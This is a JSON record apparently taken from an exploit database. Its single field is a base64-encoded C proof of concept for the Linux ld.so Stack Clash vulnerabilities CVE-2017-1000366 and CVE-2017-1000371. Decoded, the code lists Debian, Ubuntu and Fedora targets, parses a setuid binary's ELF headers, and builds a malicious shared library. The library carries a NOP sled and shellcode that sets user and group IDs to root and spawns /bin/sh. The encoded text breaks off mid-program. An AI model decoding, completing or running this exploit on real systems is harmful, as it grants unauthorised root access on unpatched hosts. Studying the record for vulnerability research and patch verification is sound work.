{
    "source": "exploit-database", 
    "exploit": "LyoNCiAqIExpbnV4X2xkc29fZHluYW1pYy5jIGZvciBDVkUtMjAxNy0xMDAwMzY2LCBDVkUtMjAxNy0xMDAwMzcxDQogKiBDb3B5cmlnaHQgKEMpIDIwMTcgUXVhbHlzLCBJbmMuDQogKg0KICogVGhpcyBwcm9ncmFtIGlzIGZyZWUgc29mdHdhcmU6IHlvdSBjYW4gcmVkaXN0cmlidXRlIGl0IGFuZC9vciBtb2RpZnkNCiAqIGl0IHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UgYXMgcHVibGlzaGVkIGJ5DQogKiB0aGUgRnJlZSBTb2Z0d2FyZSBGb3VuZGF0aW9uLCBlaXRoZXIgdmVyc2lvbiAzIG9mIHRoZSBMaWNlbnNlLCBvcg0KICogKGF0IHlvdXIgb3B0aW9uKSBhbnkgbGF0ZXIgdmVyc2lvbi4NCiAqDQogKiBUaGlzIHByb2dyYW0gaXMgZGlzdHJpYnV0ZWQgaW4gdGhlIGhvcGUgdGhhdCBpdCB3aWxsIGJlIHVzZWZ1bCwNCiAqIGJ1dCBXSVRIT1VUIEFOWSBXQVJSQU5UWTsgd2l0aG91dCBldmVuIHRoZSBpbXBsaWVkIHdhcnJhbnR5IG9mDQogKiBNRVJDSEFOVEFCSUxJVFkgb3IgRklUTkVTUyBGT1IgQSBQQVJUSUNVTEFSIFBVUlBPU0UuICBTZWUgdGhlDQogKiBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBmb3IgbW9yZSBkZXRhaWxzLg0KICoNCiAqIFlvdSBzaG91bGQgaGF2ZSByZWNlaXZlZCBhIGNvcHkgb2YgdGhlIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlDQogKiBhbG9uZyB3aXRoIHRoaXMgcHJvZ3JhbS4gIElmIG5vdCwgc2VlIDxodHRwOi8vd3d3LmdudS5vcmcvbGljZW5zZXMvPi4NCiAqLw0KDQojZGVmaW5lIF9HTlVfU09VUkNFDQojaW5jbHVkZSA8ZWxmLmg+DQojaW5jbHVkZSA8ZmNudGwuaD4NCiNpbmNsdWRlIDxsaW1pdHMuaD4NCiNpbmNsdWRlIDxsaW5rLmg+DQojaW5jbHVkZSA8c2lnbmFsLmg+DQojaW5jbHVkZSA8c3RkZGVmLmg+DQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCiNpbmNsdWRlIDxzdHJpbmcuaD4NCiNpbmNsdWRlIDxzeXMvcGFyYW0uaD4NCiNpbmNsdWRlIDxzeXMvcmVzb3VyY2UuaD4NCiNpbmNsdWRlIDxzeXMvc3RhdC5oPg0KI2luY2x1ZGUgPHN5cy90aW1lLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZSA8c3lzL3dhaXQuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCg0KI2RlZmluZSBQQUdFU1ogKChzaXplX3QpNDA5NikNCiNkZWZpbmUgQUxJR04gKChzaXplX3QpMTYpDQoNCiNkZWZpbmUgUElFX0JBU0UgKCh1aW50cHRyX3QpMHg4MDAwMDAwMCkNCiNkZWZpbmUgUElFX1JBTkQgKChzaXplX3QpMTw8MjApDQoNCiNkZWZpbmUgU1RBQ0tfQkFTRSAoKHVpbnRwdHJfdCkweEMwMDAwMDAwKQ0KI2RlZmluZSBTVEFDS19SQU5EICgoc2l6ZV90KTg8PDIwKQ0KDQojZGVmaW5lIE1BWF9BUkdfU1RSTEVOICgoc2l6ZV90KTEyODw8MTApDQoNCnN0YXRpYyBjb25zdCBzdHJ1Y3QgdGFyZ2V0ICogdGFyZ2V0Ow0Kc3RhdGljIGNvbnN0IHN0cnVjdCB0YXJnZXQgew0KICAgIGNvbnN0IGNoYXIgKiBuYW1lOw0KICAgIGNvbnN0IGNoYXIgKiByZXBsX2xpYjsNCn0gdGFyZ2V0c1tdID0gew0KICAgIHsNCiAgICAgICAgLm5hbWUgPSAiRGViaWFuIDkgKHN0cmV0Y2gpIiwNCiAgICAgICAgLnJlcGxfbGliID0gImxpYi9pMzg2LWxpbnV4LWdudSIsDQogICAgfSwNCiAgICB7DQogICAgICAgIC5uYW1lID0gIkRlYmlhbiAxMCAoYnVzdGVyKSIsDQogICAgICAgIC5yZXBsX2xpYiA9ICJsaWIvaTM4Ni1saW51eC1nbnUiLA0KICAgIH0sDQogICAgew0KICAgICAgICAubmFtZSA9ICJVYnVudHUgMTQuMDQuNSAoVHJ1c3R5IFRhaHIpIiwNCiAgICAgICAgLnJlcGxfbGliID0gImxpYi9pMzg2LWxpbnV4LWdudSIsDQogICAgfSwNCiAgICB7DQogICAgICAgIC5uYW1lID0gIlVidW50dSAxNi4wNC4yIChYZW5pYWwgWGVydXMpIiwNCiAgICAgICAgLnJlcGxfbGliID0gImxpYi9pMzg2LWxpbnV4LWdudSIsDQogICAgfSwNCiAgICB7DQogICAgICAgIC5uYW1lID0gIlVidW50dSAxNy4wNCAoWmVzdHkgWmFwdXMpIiwNCiAgICAgICAgLnJlcGxfbGliID0gImxpYi9pMzg2LWxpbnV4LWdudSIsDQogICAgfSwNCiAgICB7DQogICAgICAgIC5uYW1lID0gIkZlZG9yYSAyMyAoU2VydmVyIEVkaXRpb24pIiwNCiAgICAgICAgLnJlcGxfbGliID0gImxpYiIsDQogICAgfSwNCiAgICB7DQogICAgICAgIC5uYW1lID0gIkZlZG9yYSAyNCAoU2VydmVyIEVkaXRpb24pIiwNCiAgICAgICAgLnJlcGxfbGliID0gImxpYiIsDQogICAgfSwNCiAgICB7DQogICAgICAgIC5uYW1lID0gIkZlZG9yYSAyNSAoU2VydmVyIEVkaXRpb24pIiwNCiAgICAgICAgLnJlcGxfbGliID0gImxpYiIsDQogICAgfSwNCn07DQoNCiNkZWZpbmUgZGllKCkgZG8geyBcDQogICAgcHJpbnRmKCJkaWVkIGluICVzOiAldVxuIiwgX19mdW5jX18sIF9fTElORV9fKTsgXA0KICAgIGV4aXQoRVhJVF9GQUlMVVJFKTsgXA0KfSB3aGlsZSAoMCkNCg0Kc3RhdGljIGNvbnN0IEVsZlcoYXV4dl90KSAqIG15X2F1eHY7DQoNCnN0YXRpYyB1bnNpZ25lZCBsb25nIGludA0KbXlfZ2V0YXV4dmFsIChjb25zdCB1bnNpZ25lZCBsb25nIGludCB0eXBlKQ0Kew0KICAgIGNvbnN0IEVsZlcoYXV4dl90KSAqIHA7DQoNCiAgICBpZiAoIW15X2F1eHYpIGRpZSgpOw0KICAgIGZvciAocCA9IG15X2F1eHY7IHAtPmFfdHlwZSAhPSBBVF9OVUxMOyBwKyspDQogICAgICAgIGlmIChwLT5hX3R5cGUgPT0gdHlwZSkNCiAgICAgICAgICAgIHJldHVybiBwLT5hX3VuLmFfdmFsOw0KICAgIGRpZSgpOw0KfQ0KDQpzdHJ1Y3QgZWxmX2luZm8gew0KICAgIHVpbnRwdHJfdCBtYXBfc3RhcnQsIG1hcF9lbmQ7DQogICAgdWludHB0cl90IGR5bl9zdGFydCwgZHluX2VuZDsNCn07DQoNCnN0YXRpYyBzdHJ1Y3QgZWxmX2luZm8NCmdldF9lbGZfaW5mbyhjb25zdCBjaGFyICogY29uc3QgYmluYXJ5KQ0Kew0KICAgIHN0YXRpYyBzdHJ1Y3QgZWxmX2luZm8gZWxmOw0KICAgIGNvbnN0IGludCBmZCA9IG9wZW4oYmluYXJ5LCBPX1JET05MWSB8IE9fTk9GT0xMT1cpOw0KICAgIGlmIChmZCA8PSAtMSkgZGllKCk7DQogICAgc3RydWN0IHN0YXQgc3Q7DQogICAgaWYgKGZzdGF0KGZkLCAmc3QpKSBkaWUoKTsNCiAgICBpZiAoIVNfSVNSRUcoc3Quc3RfbW9kZSkpIGRpZSgpOw0KICAgIGlmIChzdC5zdF9zaXplIDw9IDApIGRpZSgpOw0KICAgICNkZWZpbmUgU0FGRVNaICgoc2l6ZV90KTY0PDwyMCkNCiAgICBpZiAoc3Quc3Rfc2l6ZSA+PSAoc3NpemVfdClTQUZFU1opIGRpZSgpOw0KICAgIGNvbnN0IHNpemVfdCBzaXplID0gc3Quc3Rfc2l6ZTsNCiAgICB1aW50OF90ICogY29uc3QgYnVmID0gbWFsbG9jKHNpemUpOw0KICAgIGlmICghYnVmKSBkaWUoKTsNCiAgICBpZiAocmVhZChmZCwgYnVmLCBzaXplKSAhPSAoc3NpemVfdClzaXplKSBkaWUoKTsNCiAgICBpZiAoY2xvc2UoZmQpKSBkaWUoKTsNCg0KICAgIGlmIChzaXplIDw9IHNpemVvZihFbGZXKEVoZHIpKSkgZGllKCk7DQogICAgY29uc3QgRWxmVyhFaGRyKSAqIGNvbnN0IGVoZHIgPSAoY29uc3QgRWxmVyhFaGRyKSAqKWJ1ZjsNCiAgICBpZiAoZWhkci0+ZV9pZGVudFtFSV9NQUcwXSAhPSBFTEZNQUcwKSBkaWUoKTsNCiAgICBpZiAoZWhkci0+ZV9pZGVudFtFSV9NQUcxXSAhPSBFTEZNQUcxKSBkaWUoKTsNCiAgICBpZiAoZWhkci0+ZV9pZGVudFtFSV9NQUcyXSAhPSBFTEZNQUcyKSBkaWUoKTsNCiAgICBpZiAoZWhkci0+ZV9pZGVudFtFSV9NQUczXSAhPSBFTEZNQUczKSBkaWUoKTsNCiAgICBpZiAoZWhkci0+ZV9pZGVudFtFSV9DTEFTU10gIT0gRUxGQ0xBU1MzMikgZGllKCk7DQogICAgaWYgKGVoZHItPmVfaWRlbnRbRUlfREFUQV0gIT0gRUxGREFUQTJMU0IpIGRpZSgpOw0KICAgIGlmIChlaGRyLT5lX3R5cGUgIT0gRVRfRFlOKSBkaWUoKTsNCiAgICBpZiAoZWhkci0+ZV9tYWNoaW5lICE9IEVNXzM4NikgZGllKCk7DQogICAgaWYgKGVoZHItPmVfdmVyc2lvbiAhPSBFVl9DVVJSRU5UKSBkaWUoKTsNCiAgICBpZiAoZWhkci0+ZV9laHNpemUgIT0gc2l6ZW9mKEVsZlcoRWhkcikpKSBkaWUoKTsNCiAgICBpZiAoZWhkci0+ZV9waGVudHNpemUgIT0gc2l6ZW9mKEVsZlcoUGhkcikpKSBkaWUoKTsNCiAgICBpZiAoZWhkci0+ZV9zaGVudHNpemUgIT0gc2l6ZW9mKEVsZlcoU2hkcikpKSBkaWUoKTsNCiAgICBpZiAoZWhkci0+ZV9waG9mZiA8PSAwIHx8IGVoZHItPmVfcGhvZmYgPj0gc2l6ZSkgZGllKCk7DQogICAgaWYgKGVoZHItPmVfc2hvZmYgPD0gMCB8fCBlaGRyLT5lX3Nob2ZmID49IHNpemUpIGRpZSgpOw0KICAgIGlmIChlaGRyLT5lX3BobnVtID4gKHNpemUgLSBlaGRyLT5lX3Bob2ZmKSAvIHNpemVvZihFbGZXKFBoZHIpKSkgZGllKCk7DQogICAgaWYgKGVoZHItPmVfc2hudW0gPiAoc2l6ZSAtIGVoZHItPmVfc2hvZmYpIC8gc2l6ZW9mKEVsZlcoU2hkcikpKSBkaWUoKTsNCg0KICAgIHVuc2lnbmVkIGludCBpOw0KICB7DQogICAgaW50IGludGVycCA9IDA7DQogICAgZm9yIChpID0gMDsgaSA8IGVoZHItPmVfcGhudW07IGkrKykgew0KICAgICAgICBjb25zdCBFbGZXKFBoZHIpICogY29uc3QgcGhkciA9IChjb25zdCBFbGZXKFBoZHIpICopKGJ1ZiArIGVoZHItPmVfcGhvZmYpICsgaTsNCiAgICAgICAgaWYgKHBoZHItPnBfdHlwZSA9PSBQVF9JTlRFUlApIGludGVycCA9IDE7DQogICAgICAgIGlmIChwaGRyLT5wX3R5cGUgIT0gUFRfTE9BRCkgY29udGludWU7DQogICAgICAgIGlmIChlbGYubWFwX3N0YXJ0KSBkaWUoKTsNCg0KICAgICAgICBpZiAocGhkci0+cF9vZmZzZXQgPj0gc2l6ZSkgZGllKCk7DQogICAgICAgIGlmIChwaGRyLT5wX2ZpbGVzeiA+IHNpemUgLSBwaGRyLT5wX29mZnNldCkgZGllKCk7DQogICAgICAgIGlmIChwaGRyLT5wX2ZpbGVzeiA+IHBoZHItPnBfbWVtc3opIGRpZSgpOw0KICAgICAgICBpZiAocGhkci0+cF92YWRkciAhPSBwaGRyLT5wX3BhZGRyKSBkaWUoKTsNCiAgICAgICAgaWYgKHBoZHItPnBfdmFkZHIgPj0gU0FGRVNaKSBkaWUoKTsNCiAgICAgICAgaWYgKHBoZHItPnBfbWVtc3ogPj0gU0FGRVNaKSBkaWUoKTsNCiAgICAgICAgaWYgKHBoZHItPnBfbWVtc3ogPD0gMCkgZGllKCk7DQogICAgICAgIGlmIChwaGRyLT5wX2FsaWduICE9IFBBR0VTWikgZGllKCk7DQoNCiAgICAgICAgc3dpdGNoIChwaGRyLT5wX2ZsYWdzKSB7DQogICAgICAgICAgICBjYXNlIFBGX1IgfCBQRl9YOg0KICAgICAgICAgICAgICAgIGlmIChwaGRyLT5wX3ZhZGRyKSBkaWUoKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgUEZfUiB8IFBGX1c6DQogICAgICAgICAgICAgICAgZWxmLm1hcF9zdGFydCA9IHBoZHItPnBfdmFkZHIgJiB+KFBBR0VTWi0xKTsNCiAgICAgICAgICAgICAgICBlbGYubWFwX2VuZCA9IChwaGRyLT5wX3ZhZGRyICsgcGhkci0+cF9tZW1zeiArIFBBR0VTWi0xKSAmIH4oUEFHRVNaLTEpOw0KICAgICAgICAgICAgICAgIGlmICghZWxmLm1hcF9zdGFydCkgZGllKCk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgICAgIGRpZSgpOw0KICAgICAgICB9DQogICAgfQ0KICAgIGlmICghaW50ZXJwKSBkaWUoKTsNCiAgICBpZiAoIWVsZi5tYXBfc3RhcnQpIGRpZSgpOw0KICB9DQogICAgZm9yIChpID0gMDsgaSA8IGVoZHItPmVfc2hudW07IGkrKykgew0KICAgICAgICBjb25zdCBFbGZXKFNoZHIpICogY29uc3Qgc2hkciA9IChjb25zdCBFbGZXKFNoZHIpICopKGJ1ZiArIGVoZHItPmVfc2hvZmYpICsgaTsNCiAgICAgICAgaWYgKCEoc2hkci0+c2hfZmxhZ3MgJiBTSEZfQUxMT0MpKSBjb250aW51ZTsNCiAgICAgICAgaWYgKHNoZHItPnNoX3NpemUgPD0gMCkgZGllKCk7DQogICAgICAgIGlmIChzaGRyLT5zaF9zaXplID49IFNBRkVTWikgZGllKCk7DQogICAgICAgIGlmIChzaGRyLT5zaF9hZGRyID49IFNBRkVTWikgZGllKCk7DQogICAgICAgICN1bmRlZiBTQUZFU1oNCiAgICAgICAgY29uc3QgdWludHB0cl90IHN0YXJ0ID0gc2hkci0+c2hfYWRkcjsNCiAgICAgICAgY29uc3QgdWludHB0cl90IGVuZCA9IHN0YXJ0ICsgc2hkci0+c2hfc2l6ZTsNCg0KICAgICAgICBpZiAoIShzaGRyLT5zaF9mbGFncyAmIFNIRl9XUklURSkpIHsNCiAgICAgICAgICAgIGlmIChzdGFydCA8IGVsZi5tYXBfZW5kICYmIGVuZCA+IGVsZi5tYXBfc3RhcnQpIGRpZSgpOw0KICAgICAgICAgICAgY29udGludWU7DQogICAgICAgIH0NCiAgICAgICAgaWYgKHN0YXJ0IDwgZWxmLm1hcF9zdGFydCB8fCBlbmQgPiBlbGYubWFwX2VuZCkgZGllKCk7DQogICAgICAgIGlmIChzaGRyLT5zaF90eXBlICE9IFNIVF9EWU5BTUlDKSBjb250aW51ZTsNCiAgICAgICAgaWYgKHNoZHItPnNoX2VudHNpemUgIT0gc2l6ZW9mKEVsZlcoRHluKSkpIGRpZSgpOw0KDQogICAgICAgIGlmIChlbGYuZHluX3N0YXJ0KSBkaWUoKTsNCiAgICAgICAgZWxmLmR5bl9zdGFydCA9IHN0YXJ0Ow0KICAgICAgICBlbGYuZHluX2VuZCA9IGVuZDsNCiAgICAgICAgaWYgKCFlbGYuZHluX3N0YXJ0KSBkaWUoKTsNCiAgICB9DQogICAgaWYgKCFlbGYuZHluX3N0YXJ0KSBkaWUoKTsNCiAgICBmcmVlKGJ1Zik7DQogICAgcmV0dXJuIGVsZjsNCn0NCg0Kc3RhdGljIHZvaWQNCmNyZWF0ZV9uZWVkZWRfbGliKGNvbnN0IGNoYXIgKiBjb25zdCBuZWVkZWQpDQp7DQogICAgc3RhdGljIHN0cnVjdCBsaWIgew0KICAgICAgICB1bmlvbiB7DQogICAgICAgICAgICBzdHJ1Y3Qgew0KICAgICAgICAgICAgICAgIEVsZlcoRWhkcikgZTsNCiAgICAgICAgICAgICAgICBFbGZXKFBoZHIpIHAxOw0KICAgICAgICAgICAgICAgIEVsZlcoUGhkcikgcDI7DQogICAgICAgICAgICAgICAgRWxmVyhQaGRyKSBwMzsNCiAgICAgICAgICAgIH0gaDsNCiAgICAgICAgICAgIGNoYXIgYWxpZ25bUEFHRVNaXTsNCiAgICAgICAgfSB1Ow0KICAgICAgICBjaGFyIGNvZGUxW1BBR0VTWl07DQogICAgICAgIGNoYXIgY29kZTNbUEFHRVNaXTsNCiAgICAgICAgY2hhciBjb2RlMls4PDwyMF07DQogICAgfSBsaWIgPSB7IC51ID0geyAuaCA9IHsNCiAgICAgICAgLmUgPSB7DQogICAgICAgICAgICAuZV9pZGVudCA9IHsNCiAgICAgICAgICAgICAgICBFTEZNQUcwLA0KICAgICAgICAgICAgICAgIEVMRk1BRzEsDQogICAgICAgICAgICAgICAgRUxGTUFHMiwNCiAgICAgICAgICAgICAgICBFTEZNQUczLA0KICAgICAgICAgICAgICAgIEVMRkNMQVNTMzIsDQogICAgICAgICAgICAgICAgRUxGREFUQTJMU0IsDQogICAgICAgICAgICAgICAgRVZfQ1VSUkVOVCwNCiAgICAgICAgICAgICAgICBFTEZPU0FCSV9TWVNWLA0KICAgICAgICAgICAgICAgIDANCiAgICAgICAgICAgIH0sDQogICAgICAgICAgICAuZV90eXBlID0gRVRfRFlOLA0KICAgICAgICAgICAgLmVfbWFjaGluZSA9IEVNXzM4NiwNCiAgICAgICAgICAgIC5lX3ZlcnNpb24gPSBFVl9DVVJSRU5ULA0KICAgICAgICAgICAgLmVfcGhvZmYgPSBvZmZzZXRvZihzdHJ1Y3QgbGliLCB1LmgucDEpLA0KICAgICAgICAgICAgLmVfZWhzaXplID0gc2l6ZW9mKEVsZlcoRWhkcikpLA0KICAgICAgICAgICAgLmVfcGhlbnRzaXplID0gc2l6ZW9mKEVsZlcoUGhkcikpLA0KICAgICAgICAgICAgLmVfcGhudW0gPSAzDQogICAgICAgIH0sDQogICAgICAgIC5wMSA9IHsNCiAgICAgICAgICAgIC5wX3R5cGUgPSBQVF9MT0FELA0KICAgICAgICAgICAgLnBfb2Zmc2V0ID0gb2Zmc2V0b2Yoc3RydWN0IGxpYiwgY29kZTEpLA0KICAgICAgICAgICAgLnBfdmFkZHIgPSAwLA0KICAgICAgICAgICAgLnBfZmlsZXN6ID0gc2l6ZW9mKGxpYi5jb2RlMSksDQogICAgICAgICAgICAucF9tZW1zeiA9IHNpemVvZihsaWIuY29kZTEpLA0KICAgICAgICAgICAgLnBfZmxhZ3MgPSBQRl9SIHwgUEZfWCwNCiAgICAgICAgICAgIC5wX2FsaWduID0gUEFHRVNaDQogICAgICAgIH0sDQogICAgICAgIC5wMiA9IHsNCiAgICAgICAgICAgIC5wX3R5cGUgPSBQVF9MT0FELA0KICAgICAgICAgICAgLnBfb2Zmc2V0ID0gb2Zmc2V0b2Yoc3RydWN0IGxpYiwgY29kZTIpLA0KICAgICAgICAgICAgLnBfdmFkZHIgPSAtKHNpemVvZihsaWIuY29kZTIpICsgUEFHRVNaKSwNCiAgICAgICAgICAgIC5wX2ZpbGVzeiA9IHNpemVvZihsaWIuY29kZTIpLA0KICAgICAgICAgICAgLnBfbWVtc3ogPSBzaXplb2YobGliLmNvZGUyKSwNCiAgICAgICAgICAgIC5wX2ZsYWdzID0gUEZfUiB8IFBGX1gsDQogICAgICAgICAgICAucF9hbGlnbiA9IFBBR0VTWg0KICAgICAgICB9LA0KICAgICAgICAucDMgPSB7DQogICAgICAgICAgICAucF90eXBlID0gUFRfTE9BRCwNCiAgICAgICAgICAgIC5wX29mZnNldCA9IG9mZnNldG9mKHN0cnVjdCBsaWIsIGNvZGUzKSwNCiAgICAgICAgICAgIC5wX3ZhZGRyID0gc2l6ZW9mKGxpYi5jb2RlMSksDQogICAgICAgICAgICAucF9maWxlc3ogPSBzaXplb2YobGliLmNvZGUzKSwNCiAgICAgICAgICAgIC5wX21lbXN6ID0gc2l6ZW9mKGxpYi5jb2RlMyksDQogICAgICAgICAgICAucF9mbGFncyA9IFBGX1IgfCBQRl9YLA0KICAgICAgICAgICAgLnBfYWxpZ24gPSBQQUdFU1oNCiAgICAgICAgfQ0KICAgIH19fTsNCg0KICAgIHN0YXRpYyBjb25zdCBjaGFyIHNoZWxsY29kZVtdID0NCiAgICAgICAgIlx4ODNceGM0XHg0MFx4YjhceDE3XHgwMFx4MDBceDAwXHhiYlx4MDBceDAwXHgwMFx4MDBceGNkXHg4MFx4YjgiDQogICAgICAgICJceDJlXHgwMFx4MDBceDAwXHhiYlx4MDBceDAwXHgwMFx4MDBceGNkXHg4MFx4YjhceDNmXHgwMFx4MDBceDAwIg0KICAgICAgICAiXHhiYlx4MDBceDAwXHgwMFx4MDBceGI5XHgwMVx4MDBceDAwXHgwMFx4Y2RceDgwXHhiOFx4M2ZceDAwXHgwMCINCiAgICAgICAgIlx4MDBceGJiXHgwMFx4MDBceDAwXHgwMFx4YjlceDAyXHgwMFx4MDBceDAwXHhjZFx4ODBceGI4XHgwYlx4MDAiDQogICAgICAgICJceDAwXHgwMFx4NjhceDJmXHg3M1x4NjhceDAwXHg2OFx4MmZceDYyXHg2OVx4NmVceDg5XHhlM1x4YmFceDAwIg0KICAgICAgICAiXHgwMFx4MDBceDAwXHg1Mlx4NTNceDg5XHhlMVx4Y2RceDgwXHhiOFx4MDFceDAwXHgwMFx4MDBceGJiXHgwMCINCiAgICAgICAgIlx4MDBceDAwXHgwMFx4Y2RceDgwIjsNCg0KICAgIG1lbXNldChsaWIuY29kZTIsIDB4OTAsIHNpemVvZihsaWIuY29kZTIpKTsNCiAgICBpZiAoc2l6ZW9mKGxpYi5jb2RlMikgPD0gc2l6ZW9mKHNoZWxsY29kZSkpIGRpZSgpOw0KICAgIG1lbWNweShsaWIuY29kZTIgKyBzaXplb2YobGliLmNvZGUyKSAtIHNpemVvZihzaGVsbGNvZGUpLCBzaGVsbGNvZGUsIHNpemVvZihzaGVsbGNvZGUpKTsNCg0KICAgIGNvbnN0IGludCBmZCA9IG9wZW4obmVlZGVkLCBPX1dST05MWSB8IE9fQ1JFQVQgfCBPX1RSVU5DIHwgT19OT0ZPTExPVywgMCk7DQogICAgaWYgKGZkIDw9IC0xKSBkaWUoKTsNCiAgICBpZiAod3JpdGUoZmQsICZsaWIsIHNpemVvZihsaWIpKSAhPSAoc3NpemVfdClzaXplb2YobGliKSkgZGllKCk7DQogICAgaWYgKGZjaG1vZChmZCwgMDc1NSkpIGRpZSgpOw0KICAgIGlmIChjbG9zZShmZCkpIGRpZSgpOw0KfQ0KDQpzdGF0aWMgY29uc3QgY2hhciBteV94ODZfcGxhdGZvcm1zWzRdWzVdID0gew0KICAgICJpMzg2IiwgImk0ODYiLCAiaTU4NiIsICJpNjg2Ig0KfTsNCg0KaW50DQptYWluKGNvbnN0IGludCBteV9hcmdjLCBjb25zdCBjaGFyICogY29uc3QgbXlfYXJndltdLCBjb25zdCBjaGFyICogY29uc3QgbXlfZW52cFtdKQ0Kew0KICB7DQogICAgY29uc3QgY2hhciAqIGNvbnN0ICogcCA9IG15X2VudnA7DQogICAgd2hpbGUgKCpwKyspIDsNCiAgICBteV9hdXh2ID0gKGNvbnN0IHZvaWQgKilwOw0KICB9DQogICAgaWYgKG15X2dldGF1eHZhbChBVF9QQUdFU1opICE9IFBBR0VTWikgZGllKCk7DQoNCiAgICBpZiAobXlfYXJnYyAhPSAxKzIpIHsNCiAgICAgICAgcHJpbnRmKCJVc2FnZTogJXMgdGFyZ2V0IGJpbmFyeVxuIiwgbXlfYXJndlswXSk7DQogICAgICAgIHNpemVfdCBpOw0KICAgICAgICBmb3IgKGkgPSAwOyBpIDwgc2l6ZW9mKHRhcmdldHMpL3NpemVvZigqdGFyZ2V0cyk7IGkrKykgew0KICAgICAgICAgICAgcHJpbnRmKCJUYXJnZXQgJXp1ICVzXG4iLCBpLCB0YXJnZXRzW2ldLm5hbWUpOw0KICAgICAgICB9DQogICAgICAgIGRpZSgpOw0KICAgIH0NCiAgew0KICAgIGNvbnN0IHNpemVfdCBpID0gc3RydG91bChteV9hcmd2WzFdLCBOVUxMLCAxMCk7DQogICAgaWYgKGkgPj0gc2l6ZW9mKHRhcmdldHMpL3NpemVvZigqdGFyZ2V0cykpIGRpZSgpOw0KICAgIHRhcmdldCA9IHRhcmdldHMgKyBpOw0KICAgIHByaW50ZigiVGFyZ2V0ICV6dSAlc1xuIiwgaSwgdGFyZ2V0LT5uYW1lKTsNCiAgfQ0KICAgIGNvbnN0IGNoYXIgKiBjb25zdCBiaW5hcnkgPSByZWFscGF0aChteV9hcmd2WzJdLCBOVUxMKTsNCiAgICBpZiAoIWJpbmFyeSkgZGllKCk7DQogICAgaWYgKCpiaW5hcnkgIT0gJy8nKSBkaWUoKTsNCiAgICBpZiAoYWNjZXNzKGJpbmFyeSwgUl9PSyB8IFhfT0spKSBkaWUoKTsNCg0KICAgIGNvbnN0IHN0cnVjdCBlbGZfaW5mbyBlbGYgPSBnZXRfZWxmX2luZm8oYmluYXJ5KTsNCiAgICBwcmludGYoIm1hcF9zdGFydCAtPiBkeW5fZW5kID0gJXVcbiIsIGVsZi5keW5fZW5kIC0gZWxmLm1hcF9zdGFydCk7DQogICAgcHJpbnRmKCJkeW5fc3RhcnQgLT4gZHluX2VuZCA9ICV1XG4iLCBlbGYuZHluX2VuZCAtIGVsZi5keW5fc3RhcnQpOw0KICAgIHByaW50ZigiZHluX3N0YXJ0IC0+IG1hcF9lbmQgPSAldVxuIiwgZWxmLm1hcF9lbmQgLSBlbGYuZHluX3N0YXJ0KTsNCiAgICBwcmludGYoImR5bl9lbmQgLT4gbWFwX2VuZCA9ICV1XG4iLCBlbGYubWFwX2VuZCAtIGVsZi5keW5fZW5kKTsNCg0KICAgIGNvbnN0IGNoYXIgKiBjb25zdCBzbGFzaCA9IHN0cnJjaHIoYmluYXJ5LCAnLycpOw0KICAgIGlmICghc2xhc2gpIGRpZSgpOw0KICAgIGlmIChzbGFzaCA8PSBiaW5hcnkpIGRpZSgpOw0KICAgIGNvbnN0IGNoYXIgKiBjb25zdCBvcmlnaW4gPSBzdHJuZHVwKGJpbmFyeSwgc2xhc2ggLSBiaW5hcnkpOw0KICAgIGlmICghb3JpZ2luKSBkaWUoKTsNCiAgICBwcmludGYoIm9yaWdpbiAlcyAoJXp1KVxuIiwgb3JpZ2luLCBzdHJsZW4ob3JpZ2luKSk7DQoNCiAgICBjb25zdCBjaGFyICogY29uc3QgcGxhdGZvcm0gPSAoY29uc3Qgdm9pZCAqKW15X2dldGF1eHZhbChBVF9QTEFURk9STSk7DQogICAgaWYgKCFwbGF0Zm9ybSkgZGllKCk7DQogICAgY29uc3Qgc2l6ZV90IHBsYXRmb3JtX2xlbiA9IHN0cmxlbihwbGF0Zm9ybSk7DQogICAgaWYgKHBsYXRmb3JtX2xlbiAhPSA0KSBkaWUoKTsNCiAgew0KICAgIHNpemVfdCBpOw0KICAgIGZvciAoaSA9IDA7IDsgaSsrKSB7DQogICAgICAgIGlmIChpID49IHNpemVvZihteV94ODZfcGxhdGZvcm1zKSAvIHNpemVvZihteV94ODZfcGxhdGZvcm1zWzBdKSkgZGllKCk7DQogICAgICAgIGlmIChzdHJjbXAocGxhdGZvcm0sIG15X3g4Nl9wbGF0Zm9ybXNbaV0pID09IDApIGJyZWFrOw0KICAgIH0NCiAgfQ0KICAgIGNvbnN0IHN0cnVjdCB7DQogICAgICAgIGNvbnN0IGNoYXIgKiBzdHI7DQogICAgICAgIHNpemVfdCBsZW47DQogICAgICAgIHNpemVfdCByZXBsX2xlbjsNCiAgICB9IERTVHNbXSA9IHsNCiAgICAgICAgI2RlZmluZSBEU1RfTElCICJMSUIiDQogICAgICAgIHsgRFNUX0xJQiwgc3RybGVuKERTVF9MSUIpLCBzdHJsZW4odGFyZ2V0LT5yZXBsX2xpYikgfSwNCiAgICAgICAgI2RlZmluZSBEU1RfUExBVEZPUk0gIlBMQVRGT1JNIg0KICAgICAgICB7IERTVF9QTEFURk9STSwgc3RybGVuKERTVF9QTEFURk9STSksIHBsYXRmb3JtX2xlbiB9DQogICAgfTsNCiAgICBzaXplX3QgcmVwbF9tYXggPSBzdHJsZW4ob3JpZ2luKTsNCiAgew0KICAgIHNpemVfdCBpOw0KICAgIGZvciAoaSA9IDA7IGkgPCBzaXplb2YoRFNUcykvc2l6ZW9mKCpEU1RzKTsgaSsrKSB7DQogICAgICAgIGlmIChyZXBsX21heCA8IERTVHNbaV0ucmVwbF9sZW4pDQogICAgICAgICAgICByZXBsX21heCA9IERTVHNbaV0ucmVwbF9sZW47DQogICAgfQ0KICB9DQogICAgcHJpbnRmKCJyZXBsX21heCAlenVcbiIsIHJlcGxfbWF4KTsNCiAgICBpZiAocmVwbF9tYXggPCA0KSBkaWUoKTsNCg0KICAgIHN0YXRpYyBzdHJ1Y3Qgew0KICAgICAgICBkb3VibGUgcHJvYmFiaWxpdHk7DQogICAgICAgIHNpemVfdCBsZW4sIGd3ciwgY